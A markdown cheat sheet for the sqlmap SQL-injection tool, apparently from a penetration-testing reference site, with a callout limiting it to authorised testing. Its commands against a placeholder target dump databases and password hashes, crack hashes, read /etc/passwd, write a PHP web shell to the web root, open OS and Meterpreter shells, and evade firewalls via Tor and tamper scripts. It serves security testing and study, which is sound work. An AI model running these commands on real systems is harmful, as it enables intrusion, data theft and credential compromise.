---
title: "SQLmap"
description: "SQLmap commands for detection, database enumeration, data extraction, file read/write, OS shell, and evasion techniques."
icon: "🗄️"
weight: 16
count: 55
tags: ["sqlmap", "sql-injection", "pentesting", "security"]
---

{{< callout type="warning" >}}
SQLmap is for **authorised penetration testing, CTF competitions, and security research only**. Use only on systems you have explicit written permission to test.
{{< /callout >}}

## Basic Usage

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Specify parameter to test
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Test from saved request file (capture in Burp → Save item)
sqlmap -r request.txt

# Test specific parameter from request file
sqlmap -r request.txt -p username

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="session=abc123; id=1" -p id

# Header injection
sqlmap -u "http://target.com/" --header="X-Forwarded-For: 1*"
sqlmap -u "http://target.com/" -H "User-Agent: *"

# JSON body
sqlmap -u "http://target.com/api/user" --data='{"id":1}' --content-type="application/json"
```

## Detection & Risk

```bash
# Detection level (1–5, default 1)
sqlmap -u "http://target.com/?id=1" --level=5

# Risk level (1–3, default 1)
# 2 adds heavy time-based tests, 3 adds OR-based tests (can modify data)
sqlmap -u "http://target.com/?id=1" --risk=3

# Full aggressive scan
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3

# Specify injection technique
# B=Boolean-based, E=Error-based, U=Union-based, S=Stacked, T=Time-based, Q=Inline query
sqlmap -u "http://target.com/?id=1" --technique=BEUST

# Force DBMS (skip detection)
sqlmap -u "http://target.com/?id=1" --dbms=mysql
sqlmap -u "http://target.com/?id=1" --dbms=mssql
sqlmap -u "http://target.com/?id=1" --dbms=postgresql
sqlmap -u "http://target.com/?id=1" --dbms=oracle
sqlmap -u "http://target.com/?id=1" --dbms=sqlite
```

## Enumeration

```bash
# Banner / version
sqlmap -u "http://target.com/?id=1" --banner

# Current user
sqlmap -u "http://target.com/?id=1" --current-user

# Current database
sqlmap -u "http://target.com/?id=1" --current-db

# Check if user is DBA
sqlmap -u "http://target.com/?id=1" --is-dba

# List all databases
sqlmap -u "http://target.com/?id=1" --dbs

# List tables in database
sqlmap -u "http://target.com/?id=1" -D <database> --tables

# List columns in table
sqlmap -u "http://target.com/?id=1" -D <database> -T <table> --columns

# Dump specific columns
sqlmap -u "http://target.com/?id=1" -D <database> -T <table> -C username,password --dump

# Dump entire table
sqlmap -u "http://target.com/?id=1" -D <database> -T <table> --dump

# Dump entire database
sqlmap -u "http://target.com/?id=1" -D <database> --dump

# Dump all databases (careful — slow and noisy)
sqlmap -u "http://target.com/?id=1" --dump-all

# List users
sqlmap -u "http://target.com/?id=1" --users

# Dump password hashes
sqlmap -u "http://target.com/?id=1" --passwords

# List privileges
sqlmap -u "http://target.com/?id=1" --privileges

# List roles (Oracle)
sqlmap -u "http://target.com/?id=1" --roles

# Schema enumeration
sqlmap -u "http://target.com/?id=1" --schema
```

## Data Extraction Options

```bash
# Limit rows
sqlmap -u "http://target.com/?id=1" -D db -T users --dump --start=1 --stop=10

# Filter rows by condition
sqlmap -u "http://target.com/?id=1" -D db -T users --dump --where="id>5"

# Search for table/column name
sqlmap -u "http://target.com/?id=1" --search -T users
sqlmap -u "http://target.com/?id=1" --search -C password

# Crack dumped hashes automatically
sqlmap -u "http://target.com/?id=1" --passwords --crack

# Exclude system databases
sqlmap -u "http://target.com/?id=1" --dump-all --exclude-sysdbs
```

## File Read & Write

```bash
# Read a file from the server
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/?id=1" --file-read="C:\\Windows\\win.ini"

# Write a file to the server (requires FILE privilege)
sqlmap -u "http://target.com/?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

## OS Shell & Command Execution

```bash
# Attempt OS shell (requires stacked queries or FILE privilege)
sqlmap -u "http://target.com/?id=1" --os-shell

# Execute single OS command
sqlmap -u "http://target.com/?id=1" --os-cmd="id"
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"

# Interactive SQL shell
sqlmap -u "http://target.com/?id=1" --sql-shell

# Execute SQL query directly
sqlmap -u "http://target.com/?id=1" --sql-query="SELECT user()"

# Meterpreter shell via sqlmap
sqlmap -u "http://target.com/?id=1" --os-pwn
```

## Authentication & Sessions

```bash
# HTTP Basic auth
sqlmap -u "http://target.com/?id=1" --auth-type=Basic --auth-cred="admin:password"

# HTTP Digest auth
sqlmap -u "http://target.com/?id=1" --auth-type=Digest --auth-cred="admin:password"

# Session cookie
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=abc123"

# Maintain session across requests
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=abc123" --keep-alive

# Login form — get authenticated cookie automatically
sqlmap -u "http://target.com/?id=1" --login-url="http://target.com/login" \
  --login-data="user=admin&pass=password" \
  --login-page="<title>Login</title>"
```

## Evasion & Tamper Scripts

```bash
# Random user agent
sqlmap -u "http://target.com/?id=1" --random-agent

# Tor anonymisation
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5 --check-tor

# Delay between requests
sqlmap -u "http://target.com/?id=1" --delay=2

# Safe URL to ping between injections (avoid timeout/WAF blocks)
sqlmap -u "http://target.com/?id=1" --safe-url="http://target.com/" --safe-freq=3

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=between
sqlmap -u "http://target.com/?id=1" --tamper=randomcase
sqlmap -u "http://target.com/?id=1" --tamper=charencode
sqlmap -u "http://target.com/?id=1" --tamper=base64encode
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,charencode

# List all available tamper scripts
sqlmap --list-tampers
```

## Common Tamper Scripts

```
space2comment       Replace space with /**/
between             Replace > and < with BETWEEN
randomcase          Random upper/lower case keywords (SeLeCt)
charencode          URL encode characters
chardoubleencode    Double URL encode
base64encode        Base64 encode payload
equaltolike         Replace = with LIKE
greatest            Replace > with GREATEST()
ifnull2ifisnull     Replace IFNULL with IF(ISNULL())
multiplespaces      Add multiple spaces around keywords
space2dash          Replace space with -- comment
space2mssqlblank    Replace space with random blank chars (MSSQL)
versionedmorekeywords  MySQL versioned comments
```

## Output & Verbosity

```bash
# Verbosity levels (0–6)
sqlmap -u "http://target.com/?id=1" -v 0     # show only critical
sqlmap -u "http://target.com/?id=1" -v 1     # show info (default)
sqlmap -u "http://target.com/?id=1" -v 3     # show payloads
sqlmap -u "http://target.com/?id=1" -v 5     # show HTTP requests
sqlmap -u "http://target.com/?id=1" -v 6     # show HTTP responses

# Output directory
sqlmap -u "http://target.com/?id=1" --output-dir=/tmp/sqlmap_out

# Save and resume session
sqlmap -u "http://target.com/?id=1" --save=session.conf
sqlmap -c session.conf

# Batch mode (no prompts, use defaults)
sqlmap -u "http://target.com/?id=1" --batch

# Answer yes to all prompts
sqlmap -u "http://target.com/?id=1" --answers="crack=Y,dict=Y"

# Flush session (re-test from scratch)
sqlmap -u "http://target.com/?id=1" --flush-session
```

## Proxy Through Burp

```bash
# Route sqlmap through Burp for inspection
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# With Burp CA cert
sqlmap -u "https://target.com/?id=1" --proxy="http://127.0.0.1:8080" \
  --proxy-cred="" --ignore-proxy=False
```

## Useful Combinations

```bash
# Full enumeration from Burp-captured POST request, batch mode
sqlmap -r request.txt --batch --level=5 --risk=3 --dbs

# Dump users table with hash cracking via Tor, tampered
sqlmap -u "http://target.com/?id=1" -D app -T users --dump \
  --passwords --crack --tor --tamper=space2comment,randomcase --batch

# OS shell attempt on MSSQL with stacked queries
sqlmap -u "http://target.com/?id=1" --dbms=mssql --technique=S \
  --os-shell --batch

# Quick check — is this injectable?
sqlmap -u "http://target.com/?id=1" --batch --level=1 --risk=1 --banner
```
